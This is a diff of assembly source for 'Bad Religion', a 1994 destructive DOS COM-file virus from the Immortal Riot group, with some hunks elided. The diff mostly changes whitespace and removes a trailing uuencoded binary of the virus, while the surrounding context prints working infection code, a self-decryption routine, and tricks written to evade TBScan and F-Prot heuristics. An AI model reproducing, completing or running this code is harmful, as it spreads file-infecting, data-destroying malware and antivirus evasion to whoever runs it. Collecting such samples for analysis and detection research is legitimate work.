@@ -1,10 +1,11 @@
+; ------------------------------------------------------------------------------
 ;
 ;                        - Bad Religion -
 ;       Created by Immortal Riot's destructive development team
 ;              (c) 1994 The Unforgiven/Immortal Riot 
 ;
 ; ------------------------------------------------------------------------------
-;               ï¿½ Undetectable/Destructive COM-infector ï¿½
+;               þ Undetectable/Destructive COM-infector þ
 ; ------------------------------------------------------------------------------
 .model tiny
 .radix 16
@@ -29,8 +30,8 @@ go_back:
 mov     ax,0305h                  ; this code was included to avoid detection
 xor     bx,bx                     ; from tbscan. The vsafe disabeling code can
 int     16h                       ; be used as well, but f-prot heuristics
-                  ; complains about it.
-                 
+				  ; complains about it.
+				 
 call    en_de_crypt               ; decrypt the virus
 jmp     short real_start          ; and continue...
 
@@ -122,7 +123,7 @@ ret
 
 infect:
 lea     dx,[bp+code_end+1e]       ; 1e = adress to filename in ds:dx in our 
-                  ; new dta area!
+				  ; new dta area!
 dirinfect:
 
 mov     ax,3d02                   ; open file 
@@ -156,7 +157,7 @@ jz      finish_infect                          ;
 
 cmp     word ptr [bp+org_buf],4d5ah            ; MZ (exe-file)
 jz      finish_infect                          ;
-                        
+						
 cmp     byte ptr [bp+org_buf+1],6Dh            ; command.com
 jz      finish_infect                          ;
 
@@ -215,11 +216,3 @@ org_buf:         db      90,90,0CDh,20   ; buffer to save first four bytes in
 enc_end:         
 code_end:
 end start
-
-begin 775 bad_reli.com
-M`````+P"`>@``(LN``&\_O^![0H!N`4#,]O-%N@6`.LF``#H#P"T0+EZ`8V6
-M!`'-(>@!`,.+AB$!C;9'`;F<`#$$1D;B^L.T+,TA@/HZ=1.P`KD!`(V>+@*9
-MS29"<_O^P.OOM!G-(3P"<`+-(7('Z!``M$_K];J``+0:S2&_``%7PXV6G`*X`CW-(7,!PY.X`%?-(5)1
-MM#^Y!`"-EGH"S2&`OGT"`W1<@;YZ`I"0=%2!OGH"35IT3(&^>@):371$@+Y[
-M`FUT/8N&F`(]^@)R-#V$_G<"M"S-(73ZB98A`>@4
-M_[@`0C/)F
